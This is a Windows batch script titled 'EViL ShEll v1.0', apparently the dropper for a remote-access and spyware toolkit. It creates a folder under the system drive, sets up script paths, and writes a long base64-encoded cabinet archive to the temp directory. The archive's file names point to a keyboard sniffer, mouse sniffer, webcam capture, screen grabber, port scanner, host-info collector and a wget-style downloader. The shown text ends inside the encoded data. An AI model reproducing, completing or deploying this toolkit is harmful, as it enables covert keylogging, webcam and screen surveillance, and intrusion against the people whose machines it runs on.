@Echo off
set arg=%1
if defined arg goto %arg%
title EViL ShEll v1.0 
echo.
if not exist "%systemdrive%\_temp_" mkdir "%systemdrive%\_temp_" >nul
set path=%path%;%systemdrive%\_temp_
set vbscript=%systemdrive%\_temp_\vcmd.vbs
set jscript=%systemdrive%\_temp_\wget.js
set ps1=%systemdrive%\_temp_\screenshot.ps1
for /F "skip=1 tokens=*" %%A in ('wmic os get osarchitecture ^| findstr /r /v "^$"') do set base=%%A

rem Extracting files
if exist "%temp%\data_encode.txt" del /q "%temp%\data_encode.txt" >nul
echo TVNDRgAAAABTngIAAAAAACwAAAAAAAAAAwEBAA0AAABnQwAAsgEAAAwAAQDqOAAA >>%temp%\data_encode.txt 
echo AAAAAAAA91QLYSAAY29udHJvbF9tb3VzZS5jcwDcFgAA6jgAAAAA91SSYCAAZ2V0 >>%temp%\data_encode.txt 
echo X2FjdGl2ZV93aW5kb3dzLmNzAAB+AADGTwAAAACfVQaYIABIb3N0SW5mby5iaW4A >>%temp%\data_encode.txt 
echo ADAAAMbNAAAAADJV1AAgAHBvcnRzY2FubmVyLmJpbgC/IgAAxv0AAAAA+FQPASAA >>%temp%\data_encode.txt 
echo c2NyZWVuZ3JhYi5jcwBwAgAAhSABAAAAy1SjuiAAc2NyZWVuc2hvdC5wczEA7AcA >>%temp%\data_encode.txt 
echo APUiAQAAAPdUZ6QgAHNuaWZmZXJfa2V5Ym9hcmQuY3MAjyYAAOEqAQAAAPlUoLkg >>%temp%\data_encode.txt 
echo AHNuaWZmZXJfbW91c2UuY3MAAIQCAHBRAQAAABtTVEwgAHVuemlwLmV4ZQAdEgAA >>%temp%\data_encode.txt 
echo cNUDAAAAn1UsciAAdmNtZC52YnMAANYBAI3nAwAAADFVtI0gAHdjYW0uYmluAG8B >>%temp%\data_encode.txt 
echo AACNvQUAAADLVHF5IAB3Z2V0LmpzAE8UAAD8vgUAAAD3VAe2IAB3aW5fbW9kZS5j >>%temp%\data_encode.txt 
echo cwAxkJ5ViSUAgENL5DxbbBtXdleURIqUFZuWLeW1mxtibQ8lmqLsxHGsOI0l0bES >>%temp%\data_encode.txt 
echo vSpKthzHSShyJLEeznBnhhJVRcFii360yCaLoiiKfATbBQos0KI/XbTpfrXAoiiw >>%temp%\data_encode.txt 
echo uz8tUHTRNA361a/9a78Cu+ecOzOcGQ5ffiellpyZc889r3te93qyVaOkbvHcnmHK >>%temp%\data_encode.txt 
echo 5amhmPsxvVJVzVJZTs+ppqxrlZys75QKsgFoQzE1X5aNSr4g8wWtasgL2o6sD8X2 >>%temp%\data_encode.txt 
echo h2IcPpXqhlIq8IKSNwwxniuVq0re1HSBYOHh58asosyVK5puSglA1M+eSRcVJZHi >>%temp%\data_encode.txt 
echo OdmczxtmVtc1nV/kpl6Vkzfr8wwzbwIPuQayqbxaUk2YoRbn1ErVlOhRpXsjxXV5 >>%temp%\data_encode.txt 
echo k88tLq+t8ooNwvHCRq70u3Jyqq0sbraWal7ugrk5U9UNTV/WDAkBNcFlr0sGN3TZ >>%temp%\data_encode.txt 
echo rOrqBb6Q143tvHLJkNbUcl7Nb8nF1b2KnJ7WNKWtRBuAxF93i6RVTb68NLe4ypXK >>%temp%\data_encode.txt 
echo sgaSueWamDgNn4mJezcFMZ5RSrJqrmq5gi7LqgT+s2zqfPuaWhSL0VSODrh62e1o >>%temp%\data_encode.txt 
echo pSKyqwhFJaS+IhdMYFO4v5QtJTqk26X7WsRntMreXBlW2jEZPaWEe1dx+S3Xrc3K >>%temp%\data_encode.txt 
echo RkmXi9bjnvNImJvVy0p+y7gn/cVCgkBoTvIesqtS0QuzhpniN+bUm9wxN4JzegE5 >>%temp%\data_encode.txt 
echo RqMteEWjjZEDbioSzoJs6qWCIbmfuFGeU4tyLUlZx6VPDixaABPvgWiSuLxZUovp >>%temp%\data_encode.txt 
echo nPzdKjhfKa94dUNskQXqUFcacjm0k0ayO+jFYHRuws9UIDJltzflvY3idl4v7uZ1 >>%temp%\data_encode.txt 
echo maauqSVN5eVb2yXXtIMOxM/WKkC2ZAYI34pVU51uXC7JSnFpc9OQTSnjpupXgojN >>%temp%\data_encode.txt 
echo 5s08L5em3KbumMyb2evTsyLR3rpLElcurcxeu7SSFVS6tl7Lxa+L184DqsY2OC/f >>%temp%\data_encode.txt 
echo vXprquV4rpBXm2CgYxd3KQxbYGB5DR62EkBxN1sz9fycuqndT1N4zNzOGpR7Foyt >>%temp%\data_encode.txt 
echo YEEtUyzn9Xx5vj3KlfuihlN6SBsqJ51osT7VdOh6g79ag0TcW9C9eD52+DG3S0Z6 >>%temp%\data_encode.txt 
echo HbJ+barJ4HUY3PMNHgRaxh38Toh2omyx1lzb4l4LpywjK+TSIuNRaiTvfihebhkB >>%temp%\data_encode.txt 
echo S0071RUNGlhF3jSnmg+bWqXFqF7a2m41e0MzTa3czF+oXDpCpGx+qTppnnLT6dCb >>%temp%\data_encode.txt 
echo kBj4TIBiDgpwwUajQTcHQXC/GKiggySkAixHzeY+6opf8gFXhMpqtdzgKhfIH5qu >>%temp%\data_encode.txt 
echo 4MLSWi6bvZpdXL387sLS1SwIkallMpnJVHO8+ezl1dmla4s27pk2uGvLNuYLLTBX >>%temp%\data_encode.txt 
echo 5l6/4iF7vh2yQ3cy0wJ1YW52dj7rInymPbZD+YVWuOsuoudbItr0JjOt0K5dyWbn >>%temp%\data_encode.txt 
echo BeL5lohX51ZW1y7Nz2ZzbxL6C5mW6Jemc0vza6tibYFyJjDeyXsC+rALvJX/EDL5 >>%temp%\data_encode.txt 
echo XCpgADsnDRqnoLErVkPlESYaxa8QxdWRInAffzjPLbw7s56bWclmyfSpOvS6A50k >>%temp%\data_encode.txt 
echo qEPOan8xLc7klQJuiuVLG4amVE15RtP0YkkFyLooOEkXL7Et5FKNj/FzL7549lyS >>%temp%\data_encode.txt 
echo T7RundMu8URjTiHbqQzXJbvaNciw150M1xtk8G05aK81q0EClWHHVbglJZuuMY3P >>%temp%\data_encode.txt 
echo QxakdZ6uQo5SpaQvS01MWCcYq9u6nAd1tqy7dE6R5YoEru+f0pZuU7nx6ENM2vO2 >>%temp%\data_encode.txt 
echo CQ3uST1t2Snk4ByqvCvADSrU0dK4+QDcxnBI1x2++Wzcg6TLpbRVpoGQLyun/Wm3 >>%temp%\data_encode.txt 
echo A1q1gN4mCG8voM2pn9JMitOA+sSUfeiRxpOZpU2pPpTsbi1WtW/GWrzfCsHOpR0u >>%temp%\data_encode.txt 
echo WMt8U0t2uJwtM8Ze8v4tdpNG0JUw9PxW08B7PJe75XrbrcyDMKHIikVNNriqwV5M >>%temp%\data_encode.txt 
echo 02/x3ZK53dYB+fsdyeznxA2Nm7saL2iqIRfS3AAlYHXw8PXhZ6qvrePfk4FEt/so >>%temp%\data_encode.txt 
echo 4vGbkHwfdDA+NlXhEZTxx9TBA9zbLevExOq2rMunDExqm9AumnxDNndlWQXv3YIw >>%temp%\data_encode.txt 
echo 2JH57LWlFb6TV6qQZ/OQ8dbmVPPsGUqGOJfDFoPSYlk2t7Wi4SbONzWdGwVdUxTo >>%temp%\data_encode.txt 
echo V4MjLEfDaxUKrzyIr5pfy+CizWV7Ys5BFJCThCmTQuuH2FIKm89qu6rb6s33oN9M >>%temp%\data_encode.txt 
echo 82dOP5QFCF6C4L2ZZwm6XIT/FyVmYuIRKvZQOw9ykBU81WzuIV8//3AOIb9xDmKd >>%temp%\data_encode.txt 
echo mD4gD2mWRrbcr0M0dw7xcoL/EL20yaWG9ykqyfan9zOwA9IUOX1NL5nyfEmVJYDs >>%temp%\data_encode.txt 
echo yLqZXtVypg61Xqqk15N8nCdqCfgNGL2eTDY/hqfjUsWQ70KQRFW9pUJhSyQ7POVv >>%temp%\data_encode.txt 
echo rIuwKVJkXTJIVCiOVBxA8BS+pSLnVV6tNLe0qe+1lVrUXCILTgVP6WXwBFmqs0oG >>%temp%\data_encode.txt 
echo /EsGrpY96xWeSTZiBLBqYiShqCNEuWpg48crmlGink+tljdkPREkBnm1OInMqjsl >>%temp%\data_encode.txt 
echo XVPLEA/pbK1kSmeDJhwEq+IxYhsNnB7RErhDNo0u1JYH9USdc/E9FvJmYZtL2VpB >>%temp%\data_encode.txt 
echo rpglTb2bSEosku15BVwC/U/Gl20CV6LZKpwJcP3Wzg8ueOMmcQS/z1l+r2819OEi >>%temp%\data_encode.txt 
echo JADVmC2VLyJKOldRgOWp2qlkQHJBtPS8rG6Z2/ziRT6Z7NAEcyrsNyAegUEV9TL4 >>%temp%\data_encode.txt 
echo aV4sleHWAKvCZiWv4okPeGz+u1V8R6gr+5xrk3k6DeGaJ3hR1xuZm4GRiycGjciT >>%temp%\data_encode.txt 
echo gcjWv0dg7aZl2a+l9g6munI7LndqaPEm1+52SZEdhwNDW3buyqovtbGqrVdVUaba >>%temp%\data_encode.txt 
echo +aNogLblwq1L+pZheSS4HfiD0aAa5UUY8DjaXQUeuJSsatWt7brjdWWCyQ5rjlvL >>%temp%\data_encode.txt 
echo ZVDNvCIrFalBMSsQN2Fx8M1UcCA3RyzcWrkMO3KUnuyUBP/zSeCabN+mc9UNEchS >>%temp%\data_encode.txt 
echo JlWHCus1NlQBhuJrRn5LvtBgmwDUTnB4kf6VrIANb1Tcc3oweN7EQwZeqOo66GzV >>%temp%\data_encode.txt 
echo J03tiKqgF70PlOjdAkHOokbHzEhPvH5AnRvfoBb9njjZyNEKuoVBhATxAjVp3VET >>%temp%\data_encode.txt 
echo Jy/VCl+MilsDWhcXzd1tWVbSKzLlUDCRVfbp1AaxDE+X0AXLIlRRF1N6fKBsy9qO >>%temp%\data_encode.txt 
echo vLHHF2sLUbz1GU5Dy5kapCBFHGkVnFNuoy4HnmEJSQxuyJANYbjIgaqi7UKKBVJQ >>%temp%\data_encode.txt 
echo 5Xi6Y3mAYRt58tah+4OXp6jntyz74O0jtw8KYdmnhTwPzT6JZPOS5H0jXPyLbL6k >>%temp%\data_encode.txt 
echo dl+UMoFF2ZX/u6g0mTbF1mYPBQE2XfPaLvR1SRQicXobeCX4++/zZuOJByxnp5K6 >>%temp%\data_encode.txt 
echo qkKifT33vGnRfmfZgq/g2NxC+Lpap1J19GZHd+LVK0Bb7t7DgXviWi+BnWrdeHR1 >>%temp%\data_encode.txt 
echo TwLYtawT9k7jSKEZ5K7ufT7xm7yZEv85Q0P/czdiFukA4oEJupkHIe5VUlGi7ouU >>%temp%\data_encode.txt 
echo YvtYwy2OtYe0RA1Cdr/OUtsDuVIwMwC3e2029h6hNtN791EbUR4fvjbuf+2+v9o8 >>%temp%\data_encode.txt 
echo irVxv0vTpTZ3s310Di0KtAe/wPHk07JIV7vITLttpHiE24M7t6vMYCWmsi3GWY7t >>%temp%\data_encode.txt 
echo wZPJZFZmaTbDNKbAn8wKACvBkwqjafY6QFT46gArsCk2xGKsOZUVGFNpfhkgaTZH >>%temp%\data_encode.txt 
echo TzhbYxXAxbsdoiTDrNbU2vFahWsNntrhzQI8D3AVZDBItoLDG78T9MfZKwCtwowy >>%temp%\data_encode.txt 
echo YOtA4VXPaBbm4+gsSX4L6KBG14hnEe53AcpptAxPnJ2Gr8G2nRET7mW4FoB6xbEw >>%temp%\data_encode.txt 
echo h99N+M2T7TlQclPnMNdNP+2R6BLIYxIHHcYukN47MN8ESiWivQh0b8H4DkvB0wLp >>%temp%\data_encode.txt 
echo ZVpjb8Jshca4h+o0wbcIF+2mEicD/jSQHSF+2XN0NUFCnCNbVkBJFNJCJvmERbYB >>%temp%\data_encode.txt 
echo zwTYBeK2S39p0nqHbQDXNGmzBWPodRO+9ZkIXKEKwDZI5wLZV4FRgziiTyD3s+wM >>%temp%\data_encode.txt 
echo Ye7TL7f+Wq+7H2sT6CuWL+MT+nk9UoLpTnRE+RXQAMfzgMeBVp5i5yJLgLWu0eon >>%temp%\data_encode.txt 
echo YCZSq+N1S0lhy85I59R08qYqXDEXiFl+mHumdyWK5AEy+ZJJfrEBttLIz93R5MaR >>%temp%\data_encode.txt 
echo rIyxDF+d/EVYAP23RCPco0vSFcdR6/cGUMVomoPxCvmTCXQTHm9An0OcBFHOkU7z >>%temp%\data_encode.txt 
echo 5DcmyKZTvtLBcihFFUaT7KZFHTHyVhbhVgaSyRrob7aMrxNFd3ZYBV3Qdnl4Xib6 >>%temp%\data_encode.txt 
echo IgcaIGexpd4axbmbugJ6FYFmIx3bHnfn4wXKUQXIGWjtzYb8wyl3Y57doFV7XLy+ >>%temp%\data_encode.txt 
echo Wz/tzkPsta/PdtO+4GRWzPaYxzFbSmwNxsqUP7H2yEBtFWxRoao4bcWBn7I3flp5 >>%temp%\data_encode.txt 
echo Wj2S5gDP7WdXPSvUzK/ccXN3vuK2QaOfmJa8j39erPiiVMh975RV8ooa9VWiJ3pc >>%temp%\data_encode.txt 
echo /Dll5V+TbL8M+HZeuQjfRGDusq2S8vDNAjRPVTBHnq1YnceWRWuT4gFlQJ4zFB+6 >>%temp%\data_encode.txt 
echo lW0FhheWtnoarWVWFjP9mbn7GGqVqwVmq6ycI5jQdppys0IVT7fycxA9dxVr9I97 >>%temp%\data_encode.txt 
echo j0nZqqrCv0zLWqJX66zDfFDx6u2a70/c2j3EjKXbBvniLXbZ15t9Xbqn+xvFnexX >>%temp%\data_encode.txt 
echo vlnxHNxdNtO9Mba92KkWXSrvyv9SVKXdvJp1sHcf9cILOPmN7Qdid2bvOytk7S2L >>%temp%\data_encode.txt 
echo 693Eudf2O8SpaHU/yFMCXdz4+1bHHAXcPOldCDhjEKuPJwy7cJ2n7sUkzev59VWi >>%temp%\data_encode.txt 
echo PeXQ80ZE81Xy7tkuBuxJut9v2DLUtYu2rAVCjw2oASXamcs+jZvPlUC7F+HPrXnU >>%temp%\data_encode.txt 
echo VT/maeW3aIUFTa9dWtU1t56NEgZD0+TpFfJyhKG/jcN30iehe+VsOn7tg6ivgoxu >>%temp%\data_encode.txt 
echo a0g+um4boGdLPn3bdcL13pezk/DHPZKK+Yt0+qGwJYBnKQ+jnlKDFknSw5sTky4J >>%temp%\data_encode.txt 
echo 3d4Rde3cdNe5lz3a/V6xvnr23lDQTfooY1zPWCd5mmXla6Qx+v48cUTLeHnYnuOF >>%temp%\data_encode.txt 
echo ToMdBHfJ0ibpcE37cBet2umXx30flAuwXhSJx4OSaBxqHoc92wWqkeMB6+qW+MB1 >>%temp%\data_encode.txt 
echo 793v2NWqjn3gOYlo5qPdV6Y0e8s6P035Mpq/rtQxk03y1CbVW5kieJukszNzyTot >>%temp%\data_encode.txt 
echo 5dbpYNDqNPfvTnzM5tDMwvW7IK9dsaJBajjhEPMO2MJbP2S9jLE++N65w9hnTHxe >>%temp%\data_encode.txt 
echo Y+0/34PvE8/97An20+ivnv+sZ/5Xz69ulwxe0bUtPV92vT+oV/H/r4vPLuV4WSvK >>%temp%\data_encode.txt 
echo 6aGh2HcsGstZxuZ7etnp0af/1qb7JfjYYE+GgeqMDQjYWx/DD4fvjyzp8D4k5MZP >>%temp%\data_encode.txt 
echo uD6Z4PjpZe/9PmNH6H/1q3OhTz/QXWKC7i/7A5T8e8YOweXtjxg734FNnA93RKfP >>%temp%\data_encode.txt 
echo ADxfcT2nTbmG6n1mWHqZdbldJN5L64ZeYJZsP7IU3fHigTVeS+uyohWErCgz0Xq/ >>%temp%\data_encode.txt 
echo AW/aL+bLH4vrFZrSz8zXGfvvy4z1CBLhblTGzzOZXvYnvTQ/brwDBGLh0EEO10nq >>%temp%\data_encode.txt 
echo Q3I6DFTC+wjRhgEgxRmLSYdo6Pn60FHf0Ex96JhvKF8fOg4A/ffgWTrqjIddYxJw >>%temp%\data_encode.txt 
echo jB0sw6NbgmvwMxhBurHR231D0dQQ0/8AiRwm/V0SIZHYobAUgfuD33bISIg1Ko3A >>%temp%\data_encode.txt 
echo 4MmwMYo8VgA8oP8LUNGehOfhvnjfy5+CeYx3AXW4P94fPlhDo8T7BWPjKZy1CiD9 >>%temp%\data_encode.txt 
echo P5D10/DI9P/EW9KCRbRnkE54/KzxHpKIxCPx/gMQvS8eORqWnsXpV4li5HYYTBI2 >>%temp%\data_encode.txt 
echo voUm+DbKxADhObg5/fMvDh8N3x6BdX1G48jh83j/PjLVnscnNqB/q8eWeCA+8PKv >>%temp%\data_encode.txt 
echo UeINZBeNR8MH15H+yA9SsLrDMYErJRB3MD6YOsQiEqzt+HCMjZ9i8eg+Yu+jHSyw >>%temp%\data_encode.txt 
echo G6R9h/jFo/HYRyWh+7pP9xM9ju7x2PChkeGh8ZeMAsryRPyJePTgBqr+RPxQfOiT >>%temp%\data_encode.txt 
echo g7dI8Sduh4s+xeNDo+vDQ/Gh+KGPSmf+ASRYryvrWlc976h9OH5YqC0jqyPxI+GD >>%temp%\data_encode.txt 
echo my614wOEK9Q+Gj9aVztOah/Zv+lVO+4G2Woficdttd/2qV1yqR0fHh4ZPgZqb6Is >>%temp%\data_encode.txt 
echo x+PH40cO3kW1j8eH48c+OXiH1D5+O7zlV/sYqH0sfiw+TGof2X+7rvYYqHEEY3u1 >>%temp%\data_encode.txt 
echo 57U/7jmMMTucCbFPRbzHWeij0uiZp0P6n6MgABk/PRTS/8J+GO8ZhQA5bAWz1I+/ >>%temp%\data_encode.txt 
echo 49shjEeIdDRheOR2D7q7H2nGOAn8Ic5OoRhh7SkMvR4cimgSgiJaEqNL/zvgdTQk >>%temp%\data_encode.txt 
echo gZyxD8+CsNK4E8tjiZCUQtyxGOoxnOlhI5TnQW7932FeLCzMOCKdJjSh24Sob6Cb >>%temp%\data_encode.txt 
echo SB6YBQaPho72SmliPHC7jyTui8TGQwMxiM9xCMwxyGV9rA+07se5BlCJndBXw6yi >>%temp%\data_encode.txt 
echo b8CPlsG5J/SKH/CBH/ChH/AJAn7iAvwNAn7uAvyzH/ClH/AbP+ArPyAW8QGe9ANO >>%temp%\data_encode.txt 
echo +gEv+AHTfsCyH/AOApRIHfB9P+CHfsCnfsBf+gE/8wP+CQH/6gL8BgFfuQDHBnxT >>%temp%\data_encode.txt 
echo EgjIDNiAmP4G3A9GpEl4AhcFL4baMNw3fso4g24HYXwWY7p/IN6vgUONx9gXkZOI >>%temp%\data_encode.txt 
echo 8UU/orF431gPNQ5f9hz/n54I3PY43nhOfw+Ih3qlF+FxDHwuwoZF8YyzD8DH+0bX >>%temp%\data_encode.txt 
echo v4eXD87BeCys/yFia68CRki7QL+vwO+H59DbX0JvB28dl17GOyx0sZC2gn57gQLo >>%temp%\data_encode.txt 
echo 5Z+gFCHtNYq13kMDqRth/Zeo7Zfw8/QPULITIyFtFklCy9Lz4xOjIe1y/enJkDZt >>%temp%\data_encode.txt 
echo s/vxiacEJfEkeEbtChsbf8UinY6ixA5JFz0XMSF7fTYbzzAx31KgPhTWdaK46gWD >>%temp%\data_encode.txt 
echo Wou2pmKREkDhTwkVB06cDp8U2dIzZ941hyIZZ31Gs+abz3rDPQtKMs36nGa90WxW >>%temp%\data_encode.txt 
echo WO+LIcIVvzoZAi9jog4fDeuX4VGa8pojLA15k9gi01WcJroZSlxjb7BQnfHTNlrN >>%temp%\data_encode.txt 
echo j/Y7TP8jH8zOeQ55yF/97CvwlYiTvwBrkEgfYuRzsaHzfwYIUe0iNSng5PpfxexS >>%temp%\data_encode.txt 
echo iCbJIuinCHqVnG/kdmg4HA+nngP4SET7LeqHBuJ9kdF1dKOYdglZjy8x/bOY00Eh >>%temp%\data_encode.txt 
echo jX9zyELnkhoGEMwjUawpzw44awGtB9RVJCvGUEBwstiF1Tt37nwxGE1Folb7Epae >>%temp%\data_encode.txt 
echo oe7ki6eg7YjHtBm0xiwOYUeEA9BjjPU8i7XtSfbXv2CDokuNsF9/yZ4CcM+3Q/u4 >>%temp%\data_encode.txt 
echo ixiDa6917bOu/Xgdhhrwdg/18nHLsCwU6tU/R/VGsQ/E6SHpqO1MsXDqGGH8lweD >>%temp%\data_encode.txt 
echo uVAGI9BihvT/BQRrDNCPDNrovURw2MaGABcERzwYzIUCcSJQJB8KgM44oD6ie8ye >>%temp%\data_encode.txt 
echo RIEipp334DA3EjoBCvsGoFijMGHFmdBPRI87+Ogcgui6B4e5kdAFkKiCRGl0DOv0 >>%temp%\data_encode.txt 
echo JK40+mpvnwbbwlgqDjeXcUktzxjvGQHzDjILPDjed2xwnEVwscLWokXwqjsr1XuA >>%temp%\data_encode.txt 
echo A6E+YwQFocHEaMiAgAmPJUaOiZtnIF//Y49ozXB1PyphKIVj5J5WvIwO8TvYKolm >>%temp%\data_encode.txt 
echo bbh/ZHjg/C9o47k/gS3ZwMcQ3KH9GDZ+/Zi9w9j99XlHwfv6/q+Rqw+Oq7rud9/u >>%temp%\data_encode.txt 
echo +9qPt3v37b5dyZJ2ZVn2yisZxwIiGYgtG/xFjOU4tmVDbXCJwcR0w5pCimIRIAlB >>%temp%\data_encode.txt 
echo sZ3SyUfrJlA85KOdpAkzTSeTaUOnZZh+ZapOk2maEqXT0k8mbSbD0JbUmp7fufe9 >>%temp%\data_encode.txt 
echo XbEvbf7Q2XvOvb97z/0+57w7IlM6RV1xT47npFuHD31S9Yws5PR4M6a+c3vR+1q9 >>%temp%\data_encode.txt 
echo sQ8b7FZ0PMiJ5l6uh23vsZ8JlRXNskzVBgiUldlxV7QfzKAr1GuH7EXaddb8Jpiq >>%temp%\data_encode.txt 
echo NGkpMonIbt46SDvOmt8MaRVdeyfPsRoDW1oLDoSb2CFZwxbyaNB+hGpNstVGN097 >>%temp%\data_encode.txt 
echo kTinfZmorbwylVFtP0MiaWq2r/0lsJZm+6XduQOvNPZHh5xYHvE90dWE9NSml11F >>%temp%\data_encode.txt 
echo YPfNDKidDj/2OSJX6G+E0tjzsOs+SekM5ttLfRCdEMkGXTDp1LkD2MN12IsXcb1l >>%temp%\data_encode.txt 
echo qtWaPDfLw+fUESGpW3TDmq2DaMuxcLHR74ILC/sQrG/Hxq1GVvhyxhm3HX1S2Zfo >>%temp%\data_encode.txt 
echo rqZ96gvbah2GsoM4GytkX3giIOrQROAXhgb05jOrKbb8XHhmOeLxReEMdNsdi3yo >>%temp%\data_encode.txt 
echo s/61Lazu6NIBzMgRiF11fpnivwXHBegOOMJmerJ1A3vGKRz79Ku8vm3sTf8ejWwm >>%temp%\data_encode.txt 
echo mTI5AWPJyjqX1FUciPbLYe7LUa7gbD5MnMA3py5SY2RbiwapY623uZ7W0fBoOC0a >>%temp%\data_encode.txt 
echo 5IKlndYxeNvhilmiMlcqreP6bLh0pqpvgeuFJe3gcvu7VEBdFrdjNR9itaVd6ck5 >>%temp%\data_encode.txt 
echo rC4cq5FWo6ss+WjA+tl728g+T1LQBShyyuehLtCpnAqyzXGDFzlfWJ2K6YZ/JaNv >>%temp%\data_encode.txt 
echo sIlU7UjTqG3PNoXD98P7EAf7v8b3rmh8MXZDWT12GcturENYYSbMakRZWC8JOvpT >>%temp%\data_encode.txt 
echo Qa5ZLibC8Qw7lmsKt+umV34OTbjIc3+ST6fpJAnlZRXzgrxxh7JEyCVN/yWfnbpM >>%temp%\data_encode.txt 
echo SfDhx2VOqDIn+YilIlhDfZhW5Kd4naWNpBWkGneyL9ddD/+qelp3cT1LozANT2HJ >>%temp%\data_encode.txt 
echo k/uefhBsxp6/G1sKIwhcim5nAR2kaJDjTbWnWqcxn/ewFUpdQZkCnd9llAnSAflv >>%temp%\data_encode.txt 
echo K2X4scXkStnDb2qljMOvaK6UaRAMdz6LnUCQJo3zXHKFT0usQWuBLP7UI8WkYTUa >>%temp%\data_encode.txt 
echo uBZQkIqk3flcDASXVQ8kF0G8GAiWbg/EiyD5GIgr3V5IPoIUYiC4L3oghQgiYyC4 >>%temp%\data_encode.txt 
echo LHogUkOWMIw8Ue0tWIdNtURDLO6MLqyNtWedL0bt+THt0RXS254fQUoxEE96vZBS >>%temp%\data_encode.txt 
echo BCkD4qyG5GV+FWQMkHIECWJaKchCbytBBMENCMu9GyKlXAXZAEhFQ4qGex53p0xh >>%temp%\data_encode.txt 
echo gzZVDce70IgVhWhDZV/Ecj2Pezvw/eZpUSypFbyUi+bhtmgeiqVoyNO6TZlig0J1 >>%temp%\data_encode.txt 
echo DfmqFxmd7SiTwJel51GhkD5d8r70lfzSGbrhy7I88dGlfNTc3THTHsggUtyEDhvR >>%temp%\data_encode.txt 
echo SDXUwZzvixmriqx0g9RY9XUw/TGYqqz2Yvo7mDUx09gn+1ZheADWdDADMZh+2d+L >>%temp%\data_encode.txt 
echo GehgBmMwa+SaXsxgBzMUgxmQA72YoQ6mFoMZlIO9mFoHU49Z/UNyaBWGV3+9gxmO >>%temp%\data_encode.txt 
echo wdRkrRcz3MGsjdGtLuu9uq3tYEZiMMNyuBcz0sGsi8GslWt7Mes6mNEYzIgc6cWM >>%temp%\data_encode.txt 
echo djDrYzDr5LpezPoOZkMMZlSO9mI2dDCNGMx6ub4X0+hgxmIwG+SGXsxYdNZI8zxM >>%temp%\data_encode.txt 
echo csenzSobG2HLkAmBWKgUbLOkDbZfON6kDKOyct8HlMuedNjBIqPOoeQuvqd1kCsy >>%temp%\data_encode.txt 
echo Kna0P0THwbkzMCWhiYonbCc7uoJ26nCJlS0QaEu5MhAaykayVGrdp53M1nthWFda >>%temp%\data_encode.txt 
echo Z1V8rXW/Nganv8Mf4HBb4pJVFicC6xPjxL0ccduJY5uJuXuJa3S45oPOwmTH9raU >>%temp%\data_encode.txt 
echo 7e0sXBvJmu9yFq6LKXF9jOztHdSAszDd4TxnYarDCY3IWS553OSmZDF9TqvF/kcz >>%temp%\data_encode.txt 
echo K9q/gaEjuzD9iFjOrhdh1rKwfbeJmETon+CnQGM6nlDf7lbFFbsMPMzxb4ffBZ8S >>%temp%\data_encode.txt 
echo euhHl26LzH2MQh3+js7ZF+VgLGp7tXhvJMag1P+8U9X+KAdDU/+tTs6tUQ4GqPZ+ >>%temp%\data_encode.txt 
echo Ld4TiTE2tT1a/M5IPM3Lhu07Wm6w8SQZkStlOtEMjoY1M3bjASwZI3DsRlu5VBeQ >>%temp%\data_encode.txt 
echo 3TgHg/FBIp8Dm3Yav8i2Jhu+QtVJBzDsUrZ32Ts/aSQrczo5dGquYwOb4tv0269s >>%temp%\data_encode.txt 
echo x6lvcADValyPm86wqnOcylr9c2kbCzbnVo7dYutvqDB8abOJ3fobLf7IQBbNdnK2 >>%temp%\data_encode.txt 
echo 8RBsVctRtupe/s5x+1vFt7L45reK97N44q3iAywOkrOk38MYgvdDepClwnLmaAj6 >>%temp%\data_encode.txt 
echo 5wy+vU1pbr2O/PON2Jf/im+vKn4xS7Z7jAuTsdsvZXUgr3p71rp0xjmWc3nO/BSC >>%temp%\data_encode.txt 
echo bYHb+CWMMdkw1/FXyuQsHU/3Y9nvZAcF7HvB3hKxZ8HuBitTxN6HqffCHUGCeyGI >>%temp%\data_encode.txt 
echo tgh2fRJRYiquCusic77tSjtSh5SRtnRChQzpHBTL5nrsn+Ss3kBCfceCh/+9vxXm >>%temp%\data_encode.txt 
echo qn0zZMxv5VCPkTy/VQeGbggFN2jBjaHgRi24KRTcpAXvCAXv0IJtoWCbFmwPBdu1 >>%temp%\data_encode.txt 
echo YCYUzGjBjlCwQwt2hoKdWnBzKLhZC24JBbdowa5QsEsLdocCndDdxjoYTfCZQr4o >>%temp%\data_encode.txt 
echo vkOrEJaBT9xpdnGnE/xhn7+CkHdZEPDU72Cneeol5LT/CWfrvLocAvJN+ZOlZbQ+ >>%temp%\data_encode.txt 
echo wDGNqWdRqDaOyG6Tnf6jYRlhVC4eZH++Nv7Z1nmsXZqUZutRPvabxaLZ+CCf/LQI >>%temp%\data_encode.txt 
echo VG0keQyH+D8u58lrC+zOZ2nR3Gq0H85pTcJ4YZGDBwisDRjttBfmwtvKcO4x9cGe >>%temp%\data_encode.txt 
echo v6gHK0boV+X1N0gdIcfapqNBpsM1ZIhfFrWvCP0t1BSTtO8HOQ45q7rW6dmE6lna >>%temp%\data_encode.txt 
echo 4hgFjWcaZ4QVXM5alcs5Jyq3SZXzU26PyJRkfPdPutKkHxX5w2X4BwkOlFcuNx5X >>%temp%\data_encode.txt 
echo XU5VdZJ2Q59OEigsQKZDWCAjzbBAVmaks6UiM3wIbvZklhM8FmiJHLLpw9yS43tT >>%temp%\data_encode.txt 
echo UyolM8qJmn4CIyBdmVVjByfpfuJ92TwiBnWwRprBZcT1vkzjf2W0CoUQvlNsP5S6 >>%temp%\data_encode.txt 
echo MrpGswNF2XgiiuD5RToyinohSUneCLlUYVvkmEz8Oi1CfIcWgV9S0day9KQTOiHQ >>%temp%\data_encode.txt 
echo pCRIkgk9DCGzflnIkl9tHvsZFSx6SqMuHavdOvaRjn2hjlXSkdwSWVY6kucw8as0 >>%temp%\data_encode.txt 
echo QB6JPdbD0M7B1t9dQWhQbOT18wVKDfG9FE3+NdHk06xXdFQhQwss3FjQunEc4SOe >>%temp%\data_encode.txt 
echo Yp8XD8K1tZN3nybL8GTOtU/PZUkwtNl23GOVY7xw2i9QJ9wGne+Ww7TxISzYiu80 >>%temp%\data_encode.txt 
echo +6h2VzpzLA5b0YFeaVXmVkxsjom/UTrT1hE1dT8ab12yGZtXKp0X1wqb1PwwyWrV >>%temp%\data_encode.txt 
echo U2nLrmimQJetZVcVN8RMn2LmVt3ZSY6V1fl8+gjvI6NWvVtd2K0ncWdhUlof5Zc0 >>%temp%\data_encode.txt 
echo Rq3wU7OGfmpOl3y91XoqjGHhXdJnKGe4e1+X0iU6OPoq5xZZl3Mf49I1oT9MHY2+ >>%temp%\data_encode.txt 
echo QmKmHD2Gwm5dwFOAbGkliRNwYkksD/qmaP/AQ0C7Kxzt8XG0LJbHhI3CCD65BL+o >>%temp%\data_encode.txt 
echo 3p9AhGXg0vRcUgfTK/ytClHJXYfEIGK9BqXf0xZjkPbahb0JzOUDKMtjXFMPsObx >>%temp%\data_encode.txt 
